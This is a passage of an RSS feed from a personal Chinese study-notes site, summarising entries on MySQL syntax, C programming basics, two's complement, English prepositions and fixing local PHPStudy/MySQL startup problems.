SELECT * FROM employees WHERE last_name LIKE # % 表示匹配任意内容的意思 # 这里的 % 表示匹配 a 字符前面和后面都有任意字符的数据 &amp;#39;%a%&amp;#39;; BETWEEN AND 查询某个字段中所有在&amp;hellip;和&amp;hellip;之间的数据。</description>
    </item>
    
    <item>
      <title>MySQL 流程控制函数</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/%E5%87%BD%E6%95%B0/%E5%8D%95%E8%A1%8C%E5%87%BD%E6%95%B0/%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6%E5%87%BD%E6%95%B0/</link>
      <pubDate>Sat, 23 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/%E5%87%BD%E6%95%B0/%E5%8D%95%E8%A1%8C%E5%87%BD%E6%95%B0/%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6%E5%87%BD%E6%95%B0/</guid>
      <description>流程控制函数 IF IF(expr1,expr2,expr3) 如果 expr1 为 true，则返回 expr2 的值，否则返回 expr3 的值。
SELECT IF(10&amp;gt;5,&amp;#39;大&amp;#39;,&amp;#39;小&amp;#39;) 查询所有员工是否都有奖金 SELECT last_name,commission_pct,IF(commission_pct IS NOT NULL,&amp;#39;有奖金&amp;#39;,&amp;#39;无奖金&amp;#39;) AS 有无奖金 FROM employees CASE 它可以当成语句用，也可以当作表达式用。
他有两种用法，第一种用法类似于 switch 语句；第二种用法类似于 多重 if 语句。
查询员工的工资，要求： 部门号 = 30，显示原工资的 1.1 倍。
部门号 = 40，显示原工资的 1.2 倍。
部门号 = 50，显示原工资的 1.3 倍。
其他部门，显示原工资。
SELECT salary, department_id, # 如果 department_id 等于下面 WHEN 后面的任意值，则执行这个值对应的 THEN 后面的语句。 CASE department_id 	WHEN 30	THEN salary * 1.1 	WHEN 40 THEN salary * 1.</description>
    </item>
    
    <item>
      <title>MySQL ALTER</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/ddl/alter/</link>
      <pubDate>Fri, 22 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/ddl/alter/</guid>
      <description>ALTER 修改数据表名或者修改数据表的字段.
修改表名 ALTER TABLE 旧表名 RENAME 新表名。
ALTER TABLE rainy RENAME Su; 修改字段 ALTER TABLE 表名 CHANGE 旧字段名 新字段名 新数据类型。
ALTER TABLE su CHANGE rainy apple VARCHAR(20); 修改字段的排列位置 ALTER TABLE 表名 MODIFY 字段名 1 VARCHAR(20) AFTER 字段名 2;
ALTER TABLE su MODIFY rainy VARCHAR(20) AFTER two; 删除字段 </description>
    </item>
    
    <item>
      <title>MySQL 分组函数</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/%E5%87%BD%E6%95%B0/%E5%88%86%E7%BB%84%E5%87%BD%E6%95%B0/%E5%88%86%E7%BB%84%E5%87%BD%E6%95%B0/</link>
      <pubDate>Fri, 22 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/%E5%87%BD%E6%95%B0/%E5%88%86%E7%BB%84%E5%87%BD%E6%95%B0/%E5%88%86%E7%BB%84%E5%87%BD%E6%95%B0/</guid>
      <description>分组函数 与分组函数一同查询的字段要求是GROUP BY后的字段。
SUM 统计表中字段的和。
一般用于处理数值类型，计算时会忽略 NULL 值。
SELECT SUM(salary) FROM employees; AVG 统计表中字段的平均值。
一般用于处理数值类型，计算时会忽略 NULL 值。
SELECT AVG(salary) FROM employees; MAX 统计表中字段的最大值，可以处理任何数据类型，计算时会忽略 NULL 值。
SELECT MAX(salary) FROM employees; MIN 统计表中字段的最小值，可以处理任何数据类型，计算时会忽略 NULL 值。
SELECT MIN(salary) FROM employees; COUNT 统计表的行数，可以处理任何数据类型，计算时会忽略 NULL 值。
查询总行数 SELECT COUNT(*)FROM employees </description>
    </item>
    
    <item>
      <title>MySQL 字符函数</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/%E5%87%BD%E6%95%B0/%E5%8D%95%E8%A1%8C%E5%87%BD%E6%95%B0/%E5%AD%97%E7%AC%A6%E5%87%BD%E6%95%B0/</link>
      <pubDate>Fri, 22 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/%E5%87%BD%E6%95%B0/%E5%8D%95%E8%A1%8C%E5%87%BD%E6%95%B0/%E5%AD%97%E7%AC%A6%E5%87%BD%E6%95%B0/</guid>
      <description>字符函数 用于对字符进行处理，并返回一个字符串值。
字符串的索引都是从 1 开始的。
LENGTH(str) 返回 str 的字节长度。
在不同的字符集中，一个汉字和一个英文字母的字节长度都是不一样的。
SELECT # 在 uft-8 字符集中，一个英文和一个空格只占一个字符，一个汉字占三个字节 LENGTH(&amp;#39;Rainy 是憨憨&amp;#39;) AS 字符长度; CONCAT(str1,str2,&amp;hellip;) 将 str 1 与 str2 拼接起来，支持多个字符串。
SELECT CONCAT(last_name,&amp;#39;-&amp;#39;,first_name) AS 姓名 FROM employees; UPPER(str) 将 str 中的小写字母转为大写字母。
SELECT UPPER(&amp;#39;rainy&amp;#39;) AS 转大写 LOWER(str) 将 str 中的大写字母转为小写字母。
SELECT LOWER(&amp;#39;RAINY&amp;#39;) AS 转小写 SUBSTR(str FROM pos FOR len) 指定一个 str，从索引为 pot 的字符开始截取，一直截取到索引 len 的字符为止。若只有 pot ，则截取到最后，
SELECT SUBSTR(&amp;#39;臣世雨是个憨憨&amp;#39;,6) AS 截取至最后, SUBSTR(&amp;#39;臣世雨是个憨憨&amp;#39;,4,6) AS 截取至指定位置 INSTR(str,substr) 返回 substr 在 str 中第一次出现的索引，如果 str 中不存在 substr，则返回 0。</description>
    </item>
    
    <item>
      <title>MySQL 排序查询</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/dql/%E6%8E%92%E5%BA%8F%E6%9F%A5%E8%AF%A2/%E6%8E%92%E5%BA%8F%E6%9F%A5%E8%AF%A2/</link>
      <pubDate>Fri, 22 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/dql/%E6%8E%92%E5%BA%8F%E6%9F%A5%E8%AF%A2/%E6%8E%92%E5%BA%8F%E6%9F%A5%E8%AF%A2/</guid>
      <description>排序查询 语法 SELECT 查询列表 FROM 表名 WHERE 筛选条件 ORDER BY 排序列表 ASC DESC 升序/降序 特点  ASC 代表升序，DESC 代表降序，如果不写，则默认是升序。 支持单个字段、多个字段、表达式、函数、别名等。 一般放在查询语句的最后面，limit 语句除外。  按字段排序 查询员工信息，并按工资从高至低排序 SELECT * FROM employees WHERE salary # 降序 用 DESC ，升序用 ASC ORDER BY salary DESC; 按多个字段排序 查询员工信息，并先按工资升序，再按员工编号降序 如果有两种排序规则，若第一种排序规则中有相同的数据，那么这两个数据应该哪个在前，哪个在后呢？这时候会按照第二种排序规则进行排序，决定第一种排序规则中的相同数据的先后顺序。
SELECT *, salary AS 工资, employee_id AS 员工编号 FROM employees ORDER BY salary ASC,employee_id DESC; 按表达式排序 查询部门编号 &amp;gt;= 90 的员工信息，并按入职的先后顺序排序 SELECT * FROM employees WHERE department_id &amp;gt;= 90 # 降序 用 DESC ，升序用 ASC ORDER BY salary ASC; 按表达式排序 SELECT *, # 因为表中没有年薪这个字段，所以我们需要用表达式来计算每个员工的年薪 salary * 12*(1 + IFNULL(commission_pct,0)) AS 年薪 FROM employees ORDER BY salary * 12*(1 + IFNULL(commission_pct,0)) DESC; 按别名排序 查询员工的信息和年薪，并按年薪的高低排序 SELECT *, # 因为表中没有年薪这个字段，所以我们需要用表达式来计算每个员工的年薪 salary * 12*(1 + IFNULL(commission_pct,0)) AS 年薪 FROM employees # 用表达式所对应的别名来替代表达式，使得语句更好理解 ORDER BY 年薪 DESC; 按函数排序 查询远东的姓名和工资，并按姓的字节长度从多到少排序 SELECT LENGTH(last_name) AS 字节长度, last_name,salary FROM employees ORDER BY LENGTH(last_name) DESC;  </description>
    </item>
    
    <item>
      <title>启动 MySQL</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/%E5%90%AF%E5%8A%A8-mysql-/</link>
      <pubDate>Thu, 21 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/%E5%90%AF%E5%8A%A8-mysql-/</guid>
      <description>启动 MySQL 使用命令行 Window 操作系统中 Ctrl + Alt 打开 CMD，通过下面两条命令启动或关闭 MySQL
net start mysql # 启动 MySQL net stop mysql # 关闭 MySQL 提示服务名无效 C:\Windows\system32&amp;gt;net start mysql 服务名无效。  请键入 NET HELPMSG 2185 以获得更多的帮助。 在 MySQL 安装目录下的 bin 目录下打开管理员的 cmd，并输入命令**.\mysqld.exe install**，回车即可：
D:\AppInstallPath\PhpStudy\phpstudy_pro\Extensions\MySQL5.7.26\bin&amp;gt;.\mysqld.exe install Service successfully installed. 使用 PHPStudy 首页，直接启动 MySQL 即可，如果提示端口被占用，修改端口号即可。
登录服务端 隐藏密码登录 MySQL -h localhost -P 3306 -u root -p -h表示主机。
-P表示端口号。
-u表示用户名。
-p表示密码。
输入命令后 Enter。
MySQL -h localhost -P 3306 -u root -p Enter password: 输入密码，登录成功。</description>
    </item>
    
    <item>
      <title>C Null</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/null/</link>
      <pubDate>Wed, 20 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/null/</guid>
      <description>Null 二进制全部为零时有几种含义，为什么会有几种含义呢，这是因为解码的方式不同：
 数值零。（数值解码） 字符串结束标记符&#39;\0&#39;（字母解码） 空指针Null，此时的Null本质也是零，但这个零不代表数字 0：int i = 0，而表示某个内存单元的地址为零（地址解码）  另外，我们计算机规定，以零（Null）为地址的储存单元的内容不可读，也不可写。</description>
    </item>
    
    <item>
      <title>C 分配内存和释放内存</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E5%9F%BA%E7%A1%80/%E5%88%86%E9%85%8D%E5%86%85%E5%AD%98%E5%92%8C%E9%87%8A%E6%94%BE%E5%86%85%E5%AD%98/</link>
      <pubDate>Wed, 20 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E5%9F%BA%E7%A1%80/%E5%88%86%E9%85%8D%E5%86%85%E5%AD%98%E5%92%8C%E9%87%8A%E6%94%BE%E5%86%85%E5%AD%98/</guid>
      <description>分配内存和释放内存 分配内存 操作系统会将某一块内存空间的控制权限，交给程序。
释放内存 释放内存，可以用 C 语言中的free();函数来实现。
程序会将某一块内存空间的控制权限，交还给操作系统，使得这个程序无法对这块区域进行操作。而不是将这一块内存空间中的数据清空。</description>
    </item>
    
    <item>
      <title>C 变量为什么要初始化</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E5%9F%BA%E7%A1%80/%E5%8F%98%E9%87%8F%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%88%9D%E5%A7%8B%E5%8C%96/</link>
      <pubDate>Wed, 20 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E5%9F%BA%E7%A1%80/%E5%8F%98%E9%87%8F%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%88%9D%E5%A7%8B%E5%8C%96/</guid>
      <description>变量为什么要初始化 初始化，也叫赋值，变量不进行初始化，那么这个变量中所存放的数据就是垃圾值。
垃圾值 垃圾值（随机值）指的是其他程序使用某个内存空间所遗留下来的值。
VC++ 若发现某个变量的内存空间内有垃圾值（即该变量没进行初化），那么它会将该垃圾值替换为填充值。目的是为了避免开发者将垃圾值当做一个正常值来使用，也就是提醒开发者这个变量没有进行初始化。因此，变量若未进行初始化，该变量的内存空间内存放的是一个垃圾值。</description>
    </item>
    
    <item>
      <title>C 变量的定义和赋值</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E5%9F%BA%E7%A1%80/%E5%8F%98%E9%87%8F%E7%9A%84%E5%AE%9A%E4%B9%89%E5%92%8C%E8%B5%8B%E5%80%BC/</link>
      <pubDate>Wed, 20 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E5%9F%BA%E7%A1%80/%E5%8F%98%E9%87%8F%E7%9A%84%E5%AE%9A%E4%B9%89%E5%92%8C%E8%B5%8B%E5%80%BC/</guid>
      <description>变量的定义和赋值 系统是如何执行 int i = 5; 这个语句的  程序请求操作系统为 i 分配存储空间。 操作系统会在内存中寻找一块空闲的内存空间，将这个内存空间当作 i 来使用。 程序会将 i 和这块内存空间关联起来，也就是将 i 当作这块内存空间的名字，使得以后对 i 这个字母进行操作，就相当于对这块内存空间进行，操作。 最后将 5 存储到 i 中，也就是存储到这块空闲的区域中。  </description>
    </item>
    
    <item>
      <title>English for</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/for/</link>
      <pubDate>Wed, 20 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/for/</guid>
      <description>for 表示目的、目标、用途  为了&amp;hellip; 替代&amp;hellip; 对于&amp;hellip; 帮&amp;hellip; 给&amp;hellip;  为了&amp;hellip; for + 一个人/物，表示为了某个目标或为了某个人。
 Many people learn English for work. Girls make up for men. I run every morning for health.  给&amp;hellip; 需要，当 for 表示“给&amp;hellip;”的意思的时候，这时候的 for 不是动词“给”的意思。
 The letter is for you. The apple is for you. The packet is for me.  对于&amp;hellip; for + 一些词语构成固定搭配，可以表示“对于&amp;hellip;”的意思。
 Tea is good for your health.  表示时间、距离、数量  厉经  for + 冠词/数词 + 表示时间的名词 表示时间延续了多久。</description>
    </item>
    
    <item>
      <title>English from</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/from/</link>
      <pubDate>Wed, 20 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/from/</guid>
      <description>from 表示时间和地点的起点  从&amp;hellip; 自&amp;hellip;  From +时间点 + to/till + 另一个时间点，这个句型表示从一个时间点到另一个时间点。
 We have a class from 20:00 to 22:00 every evening.  from + 一个地点 + to + 另外一个地点，这个句型表示从一个地方到林另外一个地方。
 The beggar asks for food from door to door. I run from my house ro the school. She walked from her house to the park yesterday.  from 是一个非常特别的介词，一般的介词后面不能跟地点副词，但是 from 可以。
 from here. from abroad.  从&amp;hellip;  She just came back from the school.</description>
    </item>
    
    <item>
      <title>English inside</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/inside/</link>
      <pubDate>Wed, 20 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/inside/</guid>
      <description>inside in 和 inside 的区别主要有两个。
inside 一般不能表示时间概念，特殊情况除外，in 经常可以表示时间的概念。inside 一般不能 + 大地方名词，而 in 可以 + 大地方名词/小地方的名词。
表示时间、地点 inside + 小地方 inside + 表示地点的词构成介词短语作地点状语，表示在某个地方里。
 They played inside the yard.  </description>
    </item>
    
    <item>
      <title>English like</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/like/</link>
      <pubDate>Wed, 20 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/like/</guid>
      <description>like 表示像某个东西 like + 表示人或物的词语 表示像某个人或某个物一样。
 The leaf is like a heart. She is like her mother. You should marry a man like me.  固定搭配 look like + 名词/代词宾格 表示看起来某个事物。
 She looks like a singer. The moom looks likes a silver plate. It looks like rain today.  </description>
    </item>
    
    <item>
      <title>启动服务器时报错</title>
      <link>https://note.yxzi.xyz/note/technology/softwareuse/phpstudy/%E5%90%AF%E5%8A%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%97%B6%E6%8A%A5%E9%94%99/</link>
      <pubDate>Wed, 20 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/softwareuse/phpstudy/%E5%90%AF%E5%8A%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%97%B6%E6%8A%A5%E9%94%99/</guid>
      <description>启动服务器时报错 今天，我在 PHPStudy 中启动 Apache 和 Nginx 的时候，启动失败，提示 AH&amp;hellip;
这是因为 PHPStudy 不能被安装到带有空格的文件夹中，否则 Apache 或 Nginx 就会会无法启动。</description>
    </item>
    
    <item>
      <title>提示 hosts 不同步</title>
      <link>https://note.yxzi.xyz/note/technology/softwareuse/phpstudy/%E6%8F%90%E7%A4%BA-hosts-%E4%B8%8D%E5%90%8C%E6%AD%A5/</link>
      <pubDate>Wed, 20 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/softwareuse/phpstudy/%E6%8F%90%E7%A4%BA-hosts-%E4%B8%8D%E5%90%8C%E6%AD%A5/</guid>
      <description>提示 hosts 不同步 大概率是C:\Windows\System32\drivers\etc 路径中的 hosts 出现了一下问题：
 hosts 文件的后缀名不对，hosts 文件没有后缀名。 hosts 中的内容为空。 hosts 内容底部没有添加网站域名  # Copyright (c) 1993-1999 Microsoft Corp.  # This is a sample HOSTS file used by Microsoft TCP/IP for Windows.  # This file contains the mappings of IP addresses to host names. Each  # entry should be kept on an individual line. The IP address should  # be placed in the first column followed by the corresponding host name.</description>
    </item>
    
    <item>
      <title>无法启动 MySQL</title>
      <link>https://note.yxzi.xyz/note/technology/softwareuse/phpstudy/%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8-mysql/</link>
      <pubDate>Wed, 20 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/softwareuse/phpstudy/%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8-mysql/</guid>
      <description>无法启动 MySQL 错误一 打开 PHPStudy，启动 MySQL 失败，但用 CMD 可以正常启动 MySQL。
5.7.26 解决方案 管理员运行 CMD 输入：
net stop mysqlsc delete mysql 提示[SC] DeleteService 成功后，重新打开 PHPStudy，会发现 MySQL 可以正常启动了。
错误二 提示错误信息：
1045 access denied for user &amp;#39;root&amp;#39;@&amp;#39;localhost&amp;#39; using password yes 5.7.26 解决方案   停用 MySQL 服务 没启动的可以省略
net stop mysql   找到 MySQL 安装路径下的 my.ini
  打开 my.ini 找到 [mysqld] 然后在下面加上 skip_grant_tables，表示启动 MySQL 服务的时候跳过权限表认证
  启动数据库修改密码
  刷新权限 flush privileges</description>
    </item>
    
    <item>
      <title>C 三目运算符</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E8%BF%90%E7%AE%97%E7%AC%A6/%E4%B8%89%E7%9B%AE%E8%BF%90%E7%AE%97%E7%AC%A6/</link>
      <pubDate>Tue, 19 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E8%BF%90%E7%AE%97%E7%AC%A6/%E4%B8%89%E7%9B%AE%E8%BF%90%E7%AE%97%E7%AC%A6/</guid>
      <description>三目运算符 a ? b : c 相当于 if 语句
if (a);  b; else  c; return 0; </description>
    </item>
    
    <item>
      <title>C 逗号表达式</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E8%BF%90%E7%AE%97%E7%AC%A6/%E9%80%97%E5%8F%B7%E8%A1%A8%E8%BE%BE%E5%BC%8F/</link>
      <pubDate>Tue, 19 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E8%BF%90%E7%AE%97%E7%AC%A6/%E9%80%97%E5%8F%B7%E8%A1%A8%E8%BE%BE%E5%BC%8F/</guid>
      <description>逗号表达式 (a,b,c,d) 从左向右执行，表达式最终的值是 d 的值。
#include &amp;lt;iostream&amp;gt;#include &amp;lt;malloc.h&amp;gt; int main() {  int i;  int c = 2;  i = (c++, ++c, c + 2, c - 3);  // 执行了 c++ 与 ++c 后，c 变为了 4，然后执行 c + 2，  // 但此时并没有将 c + 2 的结果赋给 c，因此此时的 c 依旧为 4，  // 再 c - 3，则 i = 1.  printf(&amp;#34;%d&amp;#34;, i);  // return 1  return 0; } </description>
    </item>
    
    <item>
      <title>C 反转</title>
      <link>https://note.yxzi.xyz/note/technology/datastructure/algorithm/%E9%93%BE%E8%A1%A8/%E5%8F%8D%E8%BD%AC%E9%93%BE%E8%A1%A8/</link>
      <pubDate>Mon, 18 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/datastructure/algorithm/%E9%93%BE%E8%A1%A8/%E5%8F%8D%E8%BD%AC%E9%93%BE%E8%A1%A8/</guid>
      <description>反转链表 // * pHead 头指针 struct ListNode* ReverseList(struct ListNode* pHead ) { 	// pHead 头结点 	// 当为空、或者 只有一个元素时直接退出  if(pHead == NULL)  return NULL;  if(pHead-&amp;gt;next == NULL)  return pHead;   //至少两个元素时  //定义两个空指针  struct ListNode *p = NULL;  struct ListNode *temp = NULL;  // p ：首结点，断开头结点指向空  p = pHead-&amp;gt;next;  pHead-&amp;gt;next = NULL;  // 首结点的下一个结点不为空  while(p-&amp;gt;next != NULL)  {  // 记录首结点的下一个结点  temp = p-&amp;gt;next;   // 头删  p-&amp;gt;next = pHead;   // 将首结点设置为头结点  pHead = p;   // 将当前节点的下一个结点  p = temp;  } 	//退出时 p 是最后一个结点 也是最终目标链表头结点   //p 指向头结点  p-&amp;gt;next = pHead; 	//p设置为头结点  pHead = p;  //返回 pHead  return pHead; } </description>
    </item>
    
    <item>
      <title>C 链表</title>
      <link>https://note.yxzi.xyz/note/technology/datastructure/algorithm/%E9%93%BE%E8%A1%A8/%E9%93%BE%E8%A1%A8/</link>
      <pubDate>Mon, 18 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/datastructure/algorithm/%E9%93%BE%E8%A1%A8/%E9%93%BE%E8%A1%A8/</guid>
      <description>链表 链表主要是便于管理长度或数量不确定的数据，相对于数组，链表处理这种数据时比较节省内存。
链表靠节点的指针域中存放的指针地址来寻找下一个元素。
确定一个链表，只需要知道头指针即可。
优点 存取数据效率高。
不需要一个太大的内存。
缺点 查找某个位置的元素时，效率很低。
结点 链表由一个个的结点组成，每个节点左侧是数据域，右侧是指针域，数据域用来存放当前节点的有效数据，指针域用来存放下一个节点的指针地址。
链表中一个个的元素，被称之为结点，每个结点都有数据域和指针域。
首结点 链表中存放第一个有效数据的节点。
尾结点 链表中存放最后一个有效数据的节点，尾节点的指针域为 Null。
头结点 头结点的数据类型和首节点的类型一模一样。
头结点是首节点前面的那个节点。
头结点的数据域通常不存放任何有效数据，但头结点的指针域存放的是首节点的地址。
设置头结点的目的是为了方便对链表的操作。
任何一个链表都有一个头结点
空链表，指的是头结点的指针域为 Null 的链表，非空链表，指的是头结点的指针域有指向的链表。
头指针 它不是链表的节点，只是一个指针变量，用于存放头结点的指针地址。
链表实例 # include &amp;lt;stdio.h&amp;gt; # include &amp;lt;malloc.h&amp;gt; # include &amp;lt;stdlib.h&amp;gt;  // 定义一个链表 struct Node {  // 定义链表中节点的数据域  int data;  // 定义链表中节点的指针域。  // 指针域是一个 struct Node *类型的 pNext，其中 pNext 中存放的是 struct Node 变量的地址  struct Node * pNext; };  struct Node * CreateList(void); void TraverseList(struct Node *);  int main(void) {  // 定义头指针 pHead，用来存放链表的头结点的地址，  // 也就是我们可以通过 pHead 中存放中的地址，找到链表的头结点.</description>
    </item>
    
    <item>
      <title>补码</title>
      <link>https://note.yxzi.xyz/note/technology/computer/%E8%A1%A5%E7%A0%81/</link>
      <pubDate>Mon, 18 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/computer/%E8%A1%A5%E7%A0%81/</guid>
      <description>补码 在计算机中，数值一律用补码来表示和存储。
补码是现代计算机使用的编码格式，同时解决了原码和反码的瑕疵。
已知十进制求二进制的补码 求正整数的二进制补码 除 2 取余，直至商为 0，余数倒序即可
求负整数的二进制补码 先求与该负数的相反数的二进制数，然后将所有位取反，末尾位加 1，不够位数，左侧补 1。
（-3）—&amp;gt; 011 —&amp;gt; 100 —&amp;gt; 101 — 11111111,11111111,11111111,11111101 — &amp;gt; FFFFFFFD
求零的二进制补码 全是 0。
已知二进制补码求十进制 如果二进制补码首位是 0，则表示这个数是正整数。
直接转十进制即可。
如果二进制补码首位是 1，则表示这个数是负整数。
将所有位取反，末位加 1，所得数字就是该负数的绝对值加 1。
1001010 —&amp;gt; 0110101 —&amp;gt; 0110110 —&amp;gt; 57 —&amp;gt; -54
如果二进制补码全是零，则表示这个数字是 0。
原码 原码不能直接参加运算
首位是 0 表示这个数是正整数，首位是 1 表示这个数是负整数，
其余二进制位是该数字的绝对值的二进制位。
（+35）00100011，就是 35 的二进制，不足位补零，0 表示负；
（-35）10100011，最高位放符号位，1 表示负。
反码 在计算机中不常用。
（+35）—&amp;gt; 00100011，和原码补码都相同
（-35）—&amp;gt; 11011100，+ 35 的原码全部取反即可求出 -35 的反码。或者 35 的补码最低位减去 1 获得。</description>
    </item>
    
    <item>
      <title>C 枚举</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E6%9E%9A%E4%B8%BE/</link>
      <pubDate>Sun, 17 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E6%9E%9A%E4%B8%BE/</guid>
      <description>枚举 将一个事物所有可能的取值给一一列举出来。
优点 使代码更加安全。
使代码更加直观。
缺点 书写麻烦。
# include &amp;lt;stdio.h&amp;gt; # include &amp;lt;malloc.h&amp;gt; // 定义一个数据类型，并没有定义变量，该数据类型的名字为 enum WeekDay enum WeekDay{  // 每一个元素，实际上都是数字，并且第一个元素默认是从 0 开始的，  // 当然，也可以指定首个元素是多少：MonDay = 1;那么此时的 Monday 就是 1，不再是 0 了  // 那么第二个元素就是 2，不再是 1 了，  // 这样写的好处是，WeekDay 的取值只能是下面的这些枚举常量，也就是将 WeekDay 的取值范围给限制了。  // 这样会让代码更加安全，也更加直观。  MonDay, TuesDay,WednesDay,ThursDay,FriDay,SaturDay,SunDay };  int main(void) {  // 因为一个周实际上只能有 7 天，因此这个 int week 只能取1 - 7，且不能是负数或则大于7 的数  // 但默认情况下，int week 的取值大概率会超出这个范围，但我们又不能强制要求 int 的 week 的取值范围是多少  // 所以，我们就需要用到枚举  int week;  // 虽然 WednesDay = 2，但是不能写成：  // enum WeekDay newWeek = 2;  // newWeek 的值只能是枚举常量  enum WeekDay newWeek = WednesDay;  // 实际上返回的是 2  printf(&amp;#34;%d&amp;#34;,newWeek); } </description>
    </item>
    
    <item>
      <title>English before</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/before/</link>
      <pubDate>Sun, 17 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/before/</guid>
      <description>before 表示在某个时间点以前 before + 表示几点钟的数词  I get up before 7:00 every day.  before + 表示具体的时间或具体时间点的词  We must finish our lessons before this year.  before + 表示几岁的词  Rainy will marry a good man before 40 years old.  before + 表示年份的词  We sill be very rich before 2030.  before 后面不能加一段时间：before three days。
如果要表示”三天之前“，可以用 ago 这个副词：three days ago。
表示位置 before + 地点/场所/人 这种情况表示在某个地点或某个人的前面。
 He boasts before Rainy.</description>
    </item>
    
    <item>
      <title>English behind</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/behind/</link>
      <pubDate>Sun, 17 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/behind/</guid>
      <description>behind 表示时间 behind + 时间点 这种情况表示晚于某个时间点。
 your idea is behind the times.  表示位置 behind + 地点 这种情况表示在某个地方都后面或在某个人的后面。
 The cat is behind the door. The tree behind my house is very big.  表示力量、能力 behind + 表示能力的词 这种情况表示能力落后/不如或低于某人。
 I am far behind you in English.  </description>
    </item>
    
    <item>
      <title>English below</title>
